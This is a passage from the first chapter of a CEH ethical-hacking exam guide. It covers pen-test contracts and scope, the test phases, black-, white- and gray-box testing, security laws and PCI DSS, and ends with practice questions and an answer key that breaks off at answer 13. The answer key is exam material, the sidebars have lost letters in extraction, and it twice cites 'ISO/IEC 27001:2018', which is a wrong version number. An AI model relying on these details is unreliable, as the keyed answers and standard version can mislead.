flip open a laptop and start hacking away. No, instead it is a carefully laid-out plan, meticu-
lously arranged and documented to protect both you (the ethical hacker) and the client.

In general, an ethical hacker first meets with the client and signs a contract. The con-
tract defines not only the permission and authorization given to the security professional
(sometimes called a get-out-of-jail-free card ) but also confidentiality and scope. No client
would ever agree to having an ethical hacker attempt to breach security without first
ensuring the hacker will not disclose any information found during the test. Usually, this
concern results in the creation of a nondisclosure agreement (NDA).

Additionally, clients almost always want the test to proceed to a certain point in the
network structure and no further: “You can try to get through the firewall, but do not
touch the file servers on the other side…I have bitcoin wallets there.” They may also want
to restrict what types of attacks you run. For example, the client may be perfectly okay
with you attempting a password hack against their systems but may not want you to test
every DoS attack you know.

01-ch01.indd 34 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

35

Oftentimes, however, even though you’re hired to test the client’s security and you
know what’s really important in security and hacking circles, the most serious risks to a
target are not allowed to be tested because of the “criticality of the resource.” This, by the
way, is often a function of corporate trust between the pen tester and the organization
and will shift over time; what’s a critical resource in today’s test will become a focus of
scrutiny and “Let’s see what happens” next year. And if you think about it, that makes
a lot of sense: you’re asking someone to completely trust a total stranger (or group of
strangers) to have access to their valuable resources; of course there’s going to be some
time for trust-building to occur. As time passes and trust increases, the likelihood of
being allowed to test those internal, super-critical systems also increases. This really boils
down to cool and focused minds during the security testing negotiation.

Another common issue is that what is considered “too secure to test” actually turns
out to be the most vulnerable system. A pen tester interview with the client might go like
this: “What about that crusty Solaris box that runs all the back-end processing for payroll
and hasn’t been updated since 2002?” “Well, it’s really important and if it breaks, the
organization dies. We have compensating controls for stuff like that.” It’s like a sunshine
law for cyber—no mold grows where the pen test light shines.

NOTE A common term you’ll see reerenced in your CEH study is tiger
team, which is nothing more than a group o people, gathered together
by a business entity, working to address a speciic problem or goal. Ethical
hackers are sometimes part o a tiger team, set up to thoroughly test all
acets o a security system. Whether you’re hired as part o a team or as
an individual, pay attention to the rules o engagement.

The Pen Test
Companies and government agencies ask for penetration tests for a variety of reasons.
Sometimes rules and regulations force the issue. For example, many medical facilities
need to maintain compliance with the Health Insurance Portability and Accountability
Act (HIPAA) and will hire ethical hackers to conduct pen testing to ensure they are com-
pliant. Sometimes the organization’s leadership is simply security conscious and wants to
know just how well existing security controls are functioning. And sometimes pen testers
are engaged simply as part of an effort to rebuild trust and reputation after a security
breach has already occurred. It’s one thing to tell customers you’ve fixed the security flaw
that allowed the theft of all those credit cards in the first place. It’s another thing alto-
gether to show the results of a penetration test against the new controls.

With regard to your exam and to your future as an ethical hacker, there are two pro-
cesses you’ll need to know: how to set up and perform a legal penetration test and how to
proceed through the actual hack. A penetration test is a clearly defined, full-scale test of the
security controls of a system or network in order to identify security risks and vulnerabili-
ties and has three major phases. Once the pen test is agreed upon, the ethical hacker begins
the “assault” using a variety of tools, methods, and techniques, but generally follows the
same five stages of a typical hack to conduct the test. For the CEH exam, you’ll need to be
familiar with the three pen test stages and the five stages of a typical hack.

01-ch01.indd 35 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

36

A pen test has three main phases—preparation, assessment, and conclusion—and they
are fairly easy to define and understand. The preparation phase defines the time period
during which the actual contract is hammered out. The scope of the test, the types of
attacks allowed, and the individuals assigned to perform the activity are all agreed upon
in this phase. The assessment phase (sometimes also known as the security evaluation phase
or the conduct phase) is exactly what it sounds like—the actual assaults on the security
controls are conducted during this time. Lastly, the conclusion (or post-assessment) phase
defines the time when final reports are prepared for the customer, detailing the findings
of the tests (including the types of tests performed) and many times even providing rec-
ommendations to improve security.

In performing a pen test, an ethical hacker must attempt to reflect the “criminal”
world as much as possible. In other words, if the steps taken by the ethical hacker dur-
ing the pen test don’t adequately mirror what a “real” hacker would do, then the test
is doomed to failure. For that reason, most pen tests have individuals acting in various
stages of knowledge about the target of evaluation (TOE). These different types of tests are
known by three names: black box, white box, and gray box.

In black-box testing, the ethical hacker has absolutely no knowledge of the TOE.
The testing is designed to simulate an outside, unknown attacker, and it takes the most
amount of time to complete and, usually, is by far the most expensive option. For the
ethical hacker, black-box testing means a thorough romp through the five stages of an
attack and removes any preconceived notions of what to look for. The only true draw-
back to this type of test is it focuses solely on the threat outside the organization and does
not take into account any trusted users on the inside.

NOTE An important “real world versus deinition” distinction arises here:
While the pure deinition o the term implies no knowledge, a black-box
test is designed to mirror what an external hacker has and knows about
beore starting an attack. Rest assured, the bad guys have been researching
things or a long time. They know something or they wouldn’t attack in the
irst place. As a pen tester, you’d better be aware o the same things they
are when setting up your test. Additionally, you’d be well served to have a
trusted agent set up internally before taking action, to avoid inadvertently
breaking the law and hacking someone else.

White-box testing is the exact opposite of black-box testing. In this type, pen testers
have full knowledge of the network, system, and infrastructure they’re targeting. This,
quite obviously, makes the test much quicker, easier, and less expensive, and it is designed
to simulate a knowledgeable internal threat, such as a disgruntled network admin or
other trusted user.

The last type, gray-box testing, is also known as partial knowledge testing. What makes
this different from black-box testing is the assumed level of elevated privileges the tester has.
Whereas black-box testing is generally done from the network administration level, gray-
box testing assumes only that the attacker is an insider. Because most attacks do originate
from inside a network, this type of testing is valuable and can demonstrate privilege
escalation from a trusted employee.

01-ch01.indd 36 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

37

NOTE One more real-world note or you: all pen tests are not the same.
Academically, we’re orced to discuss them as i they are, but in the real
world there are basically two types o “true” pen tests—one that intends
to ully ind and explore all o the vulnerabilities within a designated
system, and the other that seeks only to determine i, how, and how easily a
system can be exploited through vulnerabilities. The bad guys aren’t going
to bother with a ull-scale look at the system once they’ve discovered a
vulnerability they can exploit.

Laws and Standards
Finally, it would be impossible to call yourself an ethical anything if you didn’t under-
stand the guidelines, standards, and laws that govern your particular area of expertise. In
our realm of IT security (and in ethical hacking), there are tons of laws and standards you
should be familiar with, not only to do a good job, but to keep you out of trouble—and
prison. We were lucky in previous versions of the exam that these laws and standards
didn’t get hit very often, but now they’re back—and with a vengeance.

I would love to promise I could provide you a comprehensive list of every law you’ll
need to know for your job, but if I did this book would be the size of an old encyclo-
pedia and you’d never buy it. There are tons of laws you need to be aware of for your
job, such as the Federal Information Security Modernization Act (FISMA), Electronics
Communications Privacy Act, PATRIOT Act, Privacy Act of 1974, Cyber Intelligence
Sharing and Protection Act (CISPA), Consumer Data Security and Notification Act,
Computer Security Act of 1987…the list really is almost endless. Since this isn’t a book
to prepare you for a state bar exam, I’m not going to get into defining all these. For the
sake of study, and keeping my page count down somewhat, we’ll just discuss a few you
should concentrate on for test purposes—mainly because they’re the ones ECC seems to
be looking at closely this go-round. When you get out in the real world, you’ll need to
learn, and know, the rest.

Sometimes You Have to Know Everything
A foundational principle in Western law and order is that ignorance of the law
does not make one free of it. In other words, if you break a law, you cannot use the
excuse that you didn’t know about the law in question. On its face this could seem
somewhat unfair. I mean, how in the world am I supposed to know EVERY law in
EVERY state and EVERY setting? The flip side of it, and the reason it’s a founda-
tional principle, is simply if ignorance were a valid excuse, any time someone was
accused of a law they could simply claim ignorance and be set free.

So how do we, as a civilized society with rule of law at our core (supposedly),
find the happy balance in this? I like the way USLegal (https://uslegal.com) puts it
(emphasis added): “Ignorance of law means want of knowledge of those laws which
a person has a duty to know and which everyman is presumed to know.” That last bit

(continued )

01-ch01.indd 37 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

38

is the important part: you, as a citizen, have a duty to know the law of the land as it
relates to you and yours. Digging a little deeper into that thought, then, ignorance
can be either voluntary or involuntary. Voluntary is pretty simple to define: if you
could have reasonably acquired knowledge of the law but you claim you do not
know of it, you’re purposeful in your ignorance. Involuntary is the area in which
there’s a little wiggle room.

For example (again from USLegal), “...case law has recognized certain exceptions
to the doctrine. For example in Cheek v. United States, 498 U.S. 192, 200-201
(U.S. 1991) the court observed that the proliferation of statutes and regulations
has sometimes made it difficult for the average citizen to know and comprehend
the extent of the duties and obligations imposed by the tax laws.” In short, the U.S.
Supreme Court stated that the overly complex tax law was more than the average
citizen could be expected to know and understand and, therefore, ignorance of cer-
tain areas of tax law has had sentencing/conviction largely reduced.

In criminal law, while ignorance may not clear a defendant of guilt, it can be a
consideration in sentencing—and this next part is very important here, particularly
where the law is unclear or the defendant sought advice from law enforcement or
regulatory officials who themselves were unaware of the law or advised against the
law as written. The entirety of the doctrine assumes the law in question has been
properly promulgated—that is, published, distributed, and made readily available
to the public so that “everyman” can be reasonably expected to know it. In other
words, to quote the Decretum Gratiani (google it), “a secret law is no law at all.”

So why am I talking about principles of law and order in a book supposedly about
ethical hacking? Because, what we’re discussing here can easily land you in a world of
trouble if you make yourself willfully ignorant of the laws as they pertain to networking,
data, and hacking. There’s more than ample legal precedent that any person taking
part in activities or employment outside what could be considered common for
an average citizen must make themselves aware of any and all applicable laws. For
example, a person running the water supply for a city, or a nuclear plant, or creating
and maintaining bridges people drive over is required to know the laws necessary to
engage in those activities.

You’re an ethical hacker, meaning (among other things) your intent is to abide by
written law (and customer agreements). But your intent means squat in a court of
law. Read up on the laws mentioned here in this book. Then go search out updates
to them. Then look for others. After all, if you’re working for a company in Georgia
but performing a pen test on a company in Wyoming with offshore facilities, which
law trumps the others and how are you supposed to know?

While your company should provide some protection for you, and is obligated
to assist you in learning/knowing the laws you’ll be held accountable to during any
given employment exercise, unfortunately the answer to that question, at least in the
eyes of the law, is you better figure it out yourself.

01-ch01.indd 38 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

39

First up is the aforementioned Health Insurance Portability and Accountability Act
(HIPAA), developed by the U.S. Department of Health and Human Services to address
privacy standards with regard to medical information. The law sets privacy standards to
protect patient medical records and health information, which, by design, are provided
to and shared with doctors, hospitals, and insurance providers. HIPAA has five sub-
sections that are fairly self-explanatory (Electronic Transactions and Code Sets, Privacy
Rule, Security Rule, National Identifier Requirements, and Enforcement) and may show
up on your exam.

Another important law for your study is the Sarbanes-Oxley (SOX) Act. SOX was
created to make corporate disclosures more accurate and reliable in order to protect the
public and investors from shady behavior. There are 11 titles within SOX that handle
everything from what financials should be reported and what should go in them, to pro-
tecting against auditor conflicts of interest and enforcement for accountability.

NOTE One thing that may help you in setting up better security is
OSSTMM—the Open Source Security Testing Methodology Manual (i
you really want to sound snooty, call it “awstem”). It’s a peer-reviewed,
ormalized methodology o security testing and analysis developed to
“provide actionable inormation that can measurably improve your
operational security.” It deines three types o compliance or testing:
legislative (government regulations), contractual (industry or group
requirements), and standards based (practices that must be ollowed in
order to remain a member o a group or organization).

When it comes to standards, again there are tons to know—maybe not necessarily for
your job, but because you’ll see them on this exam. ECC really wants you to pay atten-
tion to PCI DSS, and ISO/IEC 27001:2018. The Payment Card Industry Data Security
Standard (PCI DSS) is a security standard for organizations handling credit cards, ATM
cards, and other point-of-sales cards. The standard applies to all groups and organiza-
tions involved in the entirety of the payment process—from card issuers, to merchants,
to those storing and transmitting card information—and consist of 12 requirements:

• Requirement 1: Install and maintain firewall configuration to protect data.

• Requirement 2: Remove vendor-supplied default passwords and other default
security features.

• Requirement 3: Protect stored data.

• Requirement 4: Encrypt transmission of cardholder data.

• Requirement 5: Install, use, and update AV (antivirus).

• Requirement 6: Develop secure systems and applications.

• Requirement 7: Use “need to know” as a guideline to restrict access to data.

• Requirement 8: Assign a unique ID to each stakeholder in the process (with
computer access).

• Requirement 9: Restrict any physical access to the data.

01-ch01.indd 39 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

40

• Requirement 10: Monitor all access to data and network resources holding,
transmitting, or protecting it.

• Requirement 11: Test security procedures and systems regularly.

• Requirement 12: Create and maintain an information security policy.

NOTE Control Objectives or Inormation Technologies (COBIT) is another
security standard that used to be reerenced in the oicial courseware.
It’s still an IT governance ramework and supporting toolset designed to
provide guidance to managers on control requirements, technical issues, and
business risks. COBIT domains include planning and organization, acquisition
and implementation, delivery and support, and monitoring and evaluation.

Want more? I don’t either, so I’ll leave you with the last example ECC wants you to
focus on: the ISO/IEC 27001:2018. It provides requirements for creating, maintaining,
and improving organizational information security (IS) systems. The standard addresses
issues such as ensuring compliance with laws as well as formulating internal security
requirements and objectives.

EXAM TIP Law is a unny thing, and there are semantic terms aplenty
regarding it. Be aware o the dierences between criminal law (a body o
rules and statutes that deines conduct prohibited by the government
because it threatens and harms public saety and welare and that
establishes punishment to be imposed or the commission o such acts),
civil law (a body o rules that delineates private rights and remedies as well
as governs disputes between individuals in such areas as contracts, property,
and amily law, distinct rom criminal law), and so-called common law (law
based on societal customs and recognized and enorced by the judgments
and decrees o the courts). Anything you see question-wise on it should be
easy enough to iner, but thought you should look into it regardless.

Finally, keep in mind that information security laws are tricky things when it comes to
national borders. While it’s easy to enforce an American rule about planting seeds within
the physical borders of the United States, that law means nothing in China, Australia, or
France. When it comes to information and the Internet, though, things get trickier. The
complexities of laws in other countries simply cannot be deciphered—in this book or any
other. You will have to spend some time with your employer and your team to learn what
you need before testing anything.

Who’s to Blame?
Oftentimes in crime dramas we don’t get to see the full story. This is mainly because
we’re all focused on the one bad guy—the one person to blame for it all. But in
the digital world, things can get a little hairy in the blame game. For example,

01-ch01.indd 40 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

41

suppose Joe sends Bob something truly terrible. Maybe they’re dealing in stolen
materials or sending child porn to one another. Obviously Joe and Bob are at fault
and need to face some justice. But what about their ISPs? What about those enti-
ties that make all that illegal back and forth even possible in the first place? If Joe
sends Bob child porn over AT&T’s network, for example, why is AT&T (or the
countless other ISPs and/or networks between the two) not liable for facilitating
the transaction? If Sally sends a piece of malware and takes out Jane’s network,
would it have occurred without countless networks between them? How and why
are they not liable?

In general, and without turning this into a legal paper, the real answer is we don’t
want them to be. And that is a very good thing. For example, if Joe sends Bob printed
photos in a sealed overnight container, should the FedEx guy driving the truck be
held liable if those photos are illegal in nature? If Sally mails a bag of drugs to Jane,
is the postal worker delivering the package at fault? Of course not, and barring gross
negligence, the same protections and thought process should apply to networks.

ISPs are basically just dumb pipes we use to blast information to each other.
The faster we blast said information, the happier we all are. Don’t believe me? Go
somewhere streaming gets overcrowded and listen to how people rant about the
latest cat video lagging on their system. I’m not saying ISPs can, or do, just bask
in the sun regardless of the traffic they’re carrying: most if not all take active mea-
sures to restrict and reduce illegal activity on the networks, and they do hold some
responsibility insofar as gross negligence is concerned. But generally, they are in the
business of making sure data moves quickly from point A to point B. And it’s safer
that they stay as such.

In the Summer of 2015, the FCC classified Internet service providers as com-
mon carriers. While heretofore defined as companies that transport goods or people
for any person or company (and bearing responsibility in part for any possible loss
of the goods during transport), the use here was different: ISPs transport data, not
goods or people. In the original sense, common carriers were responsible for loss or
damage except for certain circumstances—like an Act of God, fault or fraud on the
part of the shipper, or defects in the goods themselves. When it came to telecommu-
nications, though, those stipulations didn’t apply in the same way. Therefore, innu-
merable stipulations and laws established some cover for providers: for example, the
Communications Decency Act protected against third-party content on grounds
of libel or slander, and Digital Millennium Copyright Act (DMCA) “safe harbors”
provided more liability protection in regards to copyright infringements. Not to
mention all of it continues to tie into net neutrality and the back and forth we’ve
seen on that for the past decade.

So who should be held liable for malicious or illegal traffic? Sure a purposeful
sender and knowing recipient should be. But everyone else along the way? Not as
clear to see—especially when the cat video won’t load.

01-ch01.indd 41 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

42

NOTE Don’t orget one very simple, obvious observation some people just
don’t think about: the Internet is global. The dierence between hacking
your target and hacking the government o China could be as simple as
accidentally typing the wrong number in an IP address. And while most
people believe traic is malicious only i it targets your system speciically,
many may see it as malicious i it just transits your system.

Chapter Review
Tips that will help on your exam include:

• Do not let real life trump EC-Council’s view of it. Real life and the certification
exam do not necessarily always directly correspond.

• Use time to your advantage. The exam now is split into sections, with a time
frame set up for each one. You can work and review inside the section all you
want, but once you pass through it, you can’t go back.

• Make use of the paper and pencil/pen the friendly test proctor provides you, and
as soon as you sit down, before you click START, start writing down everything
you can remember onto the paper provided.

• Trust your instincts. When you do question review, unless you absolutely, positively,
beyond any shadow of a doubt know you initially marked the wrong answer, do not
change it.

• Take the questions at face value. Don’t read into them; just answer them and
move on.

The five zones ECC has defined are Internet (outside the boundary and uncontrolled),
Internet DMZ (a controlled, buffer network between you and the uncontrolled chaos
of the Internet), production network zone (a very restricted zone that strictly controls
direct access from uncontrolled zones), intranet zone (controlled zone that has little to
no heavy restrictions), and management network zone (highly secured zone with very
strict policies).

To be a successful ethical hacker, you not only need to know how to use the tools and
techniques of the trade but also know the fundamental networking concepts that pro-
vides a secure foundation for your career. This all begins with basic networking knowl-
edge, including the seven layers of the OSI reference model (Application, Presentation,
Session, Transport, Network, Data Link, and Physical) and the four layers of the TCP/
IP stack (Application, Transport, Internet, and Network Access). Key points include the
protocol data unit (PDU) at each layer (which includes data, segment, packet, frame, and
bit), the makeup of an Ethernet frame, and the TCP three-way handshake (SYN, SYN/
ACK, ACK).

There are innumerable security concepts and terms essential to your success on the
exam, and they can’t possibly all be listed here. A few examples include the Security,
Functionality, and Usability triangle, hack value, vulnerability, zero-day attack, payload,

01-ch01.indd 42 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

43

exploit, daisy-chaining, bots, doxing, and incident response team (IRT). Memorization
is the only option for these terms.

Risk management includes identifying organizational assets, threats to those assets, and
asset vulnerabilities, allowing the company to explore which countermeasures security per-
sonnel could put into place to minimize risks as much as possible. These security controls
would then greatly increase the security posture of the systems. Controls can be preventive,
detective, or corrective. A business impact analysis (BIA) is an effort to identify the systems
and processes that are critical for operations. This includes measurements of the maximum
tolerable downtime (MTD), which provides a means to prioritize the recovery of assets
should the worst occur. A set of plans and procedures to follow in the event of a failure or a
disaster to get business services back up and running is called the business continuity plan
(BCP), which includes a disaster recovery plan (DRP), addressing exactly what to do to
recover any lost data or services.

The ALE (annualized loss expectancy) is the product of the ARO (annualized rate of
occurrence) and the SLE (single loss expectancy). The exposure factor (EF) is used to
generate the SLE (EF × value of asset).

Another bedrock of security is the security triad of confidentiality, integrity, and
availability. Confidentiality, or addressing the secrecy and privacy of information, refers
to the measures taken to prevent the disclosure of information or data to unauthorized
individuals or systems. The use of passwords is by far the most common logical measure
taken to ensure confidentiality, and attacks against passwords are the most common
confidentiality attacks. Integrity refers to the methods and actions taken to protect the
information from unauthorized alteration or revision—whether the data is at rest or
in transit. Integrity in information systems is often ensured through the use of a hash
(a one-way mathematical algorithm such as MD5 or SHA-1). Availability refers to the
communications systems and data being ready for use when legitimate users need it.
Denial-of-service (DoS) attacks are designed to prevent legitimate users from having
access to a computer resource or service and can take many forms.

Security policies represent the administrative function of security and attempt to
describe the security controls implemented in a business to accomplish a goal (defining
exactly what your business believes is the best way to secure its resources). There are many
types of security policies addressing a variety of specific issues within the organization.
Some examples are information security policy, password policy, information protection
policy, remote access policy, and firewall management policy.

Defining an ethical hacker, as opposed to a cracker (or malicious hacker), basically
comes down to the guidelines one works under—an ethical hacker works only with
explicit consent and approval from a customer. Ethical hackers are employed by custom-
ers to improve security. Crackers either act on their own or, in some cases, are employed
by malicious entities to destroy or damage government or corporate reputation. In addi-
tion, some hackers who use their knowledge to promote a political cause are referred to
as hacktivists.

Hackers are generally classified into three separate groups. White hats are the ethical
hackers hired by a customer for the specific goal of testing and improving security or
for other defensive purposes. Black hats are the crackers illegally using their skills either
for personal gain or for malicious intent, and they do not ask for permission or consent.

01-ch01.indd 43 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

44

Gray hats are neither good nor bad; they are simply curious about hacking tools and tech-
niques or feel like it’s their duty, with or without customer permission, to demonstrate
security flaws in systems. In any case, hacking without a customer’s explicit permission
and direction is a crime. Other terms include suicide hackers, state-sponsored hackers,
cyberterrorists, and script kiddies.

A penetration test, also known as a pen test, is a clearly defined, full-scale test of the
security controls of a system or network in order to identify security risks and vulnera-
bilities. The three main phases in a pen test are preparation, assessment, and conclusion.
The preparation phase defines the time period when the actual contract is hammered
out. The scope of the test, the types of attacks allowed, and the individuals assigned to
perform the activity are all agreed upon in this phase. The assessment phase (sometimes
also known as the security evaluation phase or the conduct phase) is when the actual
assaults on the security controls are conducted. The conclusion (or post-assessment)
phase defines the time when final reports are prepared for the customer, detailing the
findings of the test (including the types of tests performed) and many times even provid-
ing recommendations to improve security.

The act of hacking consists of five main phases. Reconnaissance involves the steps
taken to gather evidence and information on the targets you want to attack. It can be
passive or active in nature. The scanning and enumeration phase takes the information
gathered in recon and actively applies tools and techniques to gather more in-depth
information on the targets. In the gaining access phase, true attacks are leveled against
the targets enumerated in the second phase. In the fourth phase, maintaining access,
hackers attempt to ensure they have a way back into the machine or system they’ve
already compromised. In the final phase, covering tracks, attackers attempt to conceal
their success and avoid detection by security professionals.

Three types of tests are performed by ethical hackers. In black-box testing, the ethical
hacker has absolutely no knowledge of the target of evaluation (TOE). It’s designed to
simulate an outside, unknown attacker. In white-box testing, pen testers have full knowl-
edge of the network, system, and infrastructure they are testing, and it is designed to
simulate a knowledgeable internal threat, such as a disgruntled network admin or other
trusted user. In gray-box testing, the attacker has limited knowledge about the TOE. It is
designed to simulate privilege escalation from a trusted employee.

The guidelines, standards, and laws that govern ethical hacking are important. These
include FISMA, Electronics Communications Privacy Act, PATRIOT Act, Privacy Act
of 1974, Cyber Intelligence Sharing and Protection Act (CISPA), Consumer Data Secu-
rity and Notification Act, and Computer Security Act of 1987.

The Health Insurance Portability and Accountability Act (HIPAA) was developed by
the U.S. Department of Health and Human Services to address privacy standards with
regard to medical information. The law sets privacy standards to protect patient medi-
cal records and health information, which, by design, are provided to and shared with
doctors, hospitals, and insurance providers. HIPAA has five subsections that are fairly
self-explanatory (Electronic Transactions and Code Sets, Privacy Rule, Security Rule,
National Identifier Requirements, and Enforcement) and may show up on your exam.

01-ch01.indd 44 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

45

The Sarbanes-Oxley (SOX) Act was created to make corporate disclosures more
accurate and reliable in order to protect the public and investors from shady behavior.
There are 11 titles within SOX that handle everything from what financials should be
reported and what should go in them, to protecting against auditor conflicts of interest
and enforcement for accountability.

The Payment Card Industry Data Security Standard (PCI DSS) is a security stan-
dard for organizations handling credit cards, ATM cards, and other point-of-sales
cards. The standards apply to all groups and organizations involved in the entirety of
the payment process—from card issuers, to merchants, to those storing and transmit-
ting card information—and consist of 12 requirements:

• Requirement 1: Install and maintain firewall configuration to protect data.

• Requirement 2: Remove vendor-supplied default passwords and other default
security features.

• Requirement 3: Protect stored data.

• Requirement 4: Encrypt transmission of cardholder data.

• Requirement 5: Install, use, and update antivirus.

• Requirement 6: Develop secure systems and applications.

• Requirement 7: Use “need to know” as a guideline to restrict access to data.

• Requirement 8: Assign a unique ID to each stakeholder in the process
(with computer access).

• Requirement 9: Restrict any physical access to the data.

• Requirement 10: Monitor all access to data and network resources holding,
transmitting, or protecting it.

• Requirement 11: Test security procedures and systems regularly.

• Requirement 12: Create and maintain an information security policy.

Each domain contains specific control objectives. This standard helps security archi-
tects figure out and plan minimum security requirements for their organizations.

Lastly, ISO/IEC 27001:2018 provides requirements for creating, maintaining, and
improving organizational information security systems. The standard addresses issues
such as ensuring compliance with laws as well as formulating internal security require-
ments and objectives.

Questions
1. Which of the following would be the best example of a deterrent control?

A. A log aggregation system
B. Hidden cameras onsite
C. A guard posted outside the door
D. Backup recovery systems

01-ch01.indd 45 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

46

2. Enacted in 2002, this U.S. law requires every federal agency to implement
information security programs, including significant reporting on compliance
and accreditation. Which of the following is the best choice for this definition?
A. FISMA
B. HIPAA
C. NIST 800-53
D. OSSTMM

3. Brad has done some research and determined a certain set of systems on his
network fail once every ten years. The purchase price for each of these systems
is $1200. Additionally, Brad discovers the administrators on staff, who earn
$50 an hour, estimate five hours to replace a machine. Five employees, earning
$25 an hour, depend on each system and will be completely unproductive while
it is down. If you were to ask Brad for an ALE on these devices, what should be
his answer?
A. $2075
B. $207.50
C. $120
D. $1200

4. An ethical hacker is hired to test the security of a business network. The CEH is
given no prior knowledge of the network and has a specific framework in which
to work, defining boundaries, nondisclosure agreements, and the completion
date. Which of the following is a true statement?
A. A white hat is attempting a black-box test.
B. A white hat is attempting a white-box test.
C. A black hat is attempting a black-box test.
D. A black hat is attempting a gray-box test.

5. When an attack by a hacker is politically motivated, the hacker is said to be
participating in which of the following?
A. Black-hat hacking
B. Gray-box attacks
C. Gray-hat attacks
D. Hacktivism

6. Two hackers attempt to crack a company’s network resource security. One is
considered an ethical hacker, whereas the other is not. What distinguishes the
ethical hacker from the “cracker”?
A. The cracker always attempts white-box testing.
B. The ethical hacker always attempts black-box testing.

01-ch01.indd 46 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

47

C. The cracker posts results to the Internet.
D. The ethical hacker always obtains written permission before testing.

7. In which stage of an ethical hack would the attacker actively apply tools and
techniques to gather more in-depth information on the targets?
A. Active reconnaissance
B. Scanning and enumeration
C. Gaining access
D. Passive reconnaissance

8. Which type of attack is generally conducted as an inside attacker with elevated
privileges on the resources?
A. Gray box
B. White box
C. Black box
D. Active reconnaissance

9. Which of the following Common Criteria processes refers to the system or
product being tested?
A. ST
B. PP
C. EAL
D. TOE

10. Your company has a document that spells out exactly what employees are allowed
to do on their computer systems. It also defines what is prohibited and what
consequences await those who break the rules. A copy of this document is signed
by all employees prior to their network access. Which of the following best
describes this policy?
A. Information security policy
B. Special access policy
C. Information audit policy
D. Network connection policy

11. Sally is a member of a pen test team newly hired to test a bank’s security. She
begins searching for IP addresses the bank may own by searching public records
on the Internet. She also looks up news articles and job postings to discover
information that may be valuable. In what phase of the pen test is Sally working?
A. Preparation
B. Assessment
C. Conclusion
D. Reconnaissance

01-ch01.indd 47 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

48

12. Joe is a security engineer for a firm. His company downsizes, and Joe discovers he
will be laid off within a short amount of time. Joe plants viruses and sets about
destroying data and settings throughout the network, with no regard to being
caught. Which type of hacker is Joe considered to be?
A. Hacktivist
B. Suicide hacker
C. Black hat
D. Script kiddie

13. Elements of security include confidentiality, integrity, and availability. Which
technique provides for integrity?
A. Encryption
B. UPS
C. Hashing
D. Passwords

14. Which of the following best describes an effort to identify systems that are critical
for continuation of operation for the organization?
A. BCP
B. BIA
C. MTD
D. DRP

Answers
1. C. If you’re doing something as a deterrent, you’re trying to prevent an attack in

the first place. In this physical security deterrent control, a guard visible outside
the door could help prevent physical attacks.

2. A. FISMA has been around since 2002 and was updated in 2014. It gave certain
information security responsibilities to NIST, OMB, and other government
agencies, and declared the Department of Homeland Security (DHS) as the
operational lead for budgets and guidelines on security matters.

3. B. ALE = ARO × SLE. To determine ARO, divide the number of occurrences by
the number of years (1 occurrence/10 years = 0.1). To determine SLE, add the
purchase cost (1200) plus the amount of time to replace (5 × 50 = 250) plus the
amount of lost work (5 hours × 5 employees × 25 = 625). In this case, it all adds
up to $2075. ALE = 0.1 × 2075, or $207.50.

4. A. In this example, an ethical hacker was hired under a specific agreement,
making him a white hat. The test he was hired to perform is a no-knowledge
attack, making it a black-box test.

01-ch01.indd 48 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

49

5. D. Hackers who use their skills and talents to forward a cause or a political agenda
are practicing hacktivism.

6. D. The ethical hacker always obtains written permission before testing and never
performs a test without it!

7. B. The second of the five phases of an ethical hack attempt, scanning and
enumeration, is the step where ethical hackers take the information they gathered
in recon and actively apply tools and techniques to gather more in-depth
information on the targets.

8. B. A white-box attack is intended to simulate an internal attacker with elevated
privileges, such as a network administrator.

9. D. The target of evaluation (TOE) is the system or product being tested.
10. A. The information security policy defines what is allowed and not allowed, and

what the consequences are for misbehavior in regard to resources on the corporate
network. Generally this is signed by employees prior to their account creation.

11. B. The assessment phase, which EC-Council also likes to interchangeably denote
as the “conduct” phase sometimes, is where all the activity takes place—including
the passive information gathering performed by Sally in this example.

12. B. A suicide hacker doesn’t care about being caught. Jail time and punishment
mean nothing to these guys. While sometimes they are tied to a political or
religious group or function, sometimes they’re just angry folks looking to make
an entity pay for some perceived wrongdoing.

13. C. A hash is a unique numerical string, created by a hashing algorithm on a
given piece of data, used to verify data integrity. Generally, hashes are used to
verify the integrity of files after download (comparison to the hash value on the
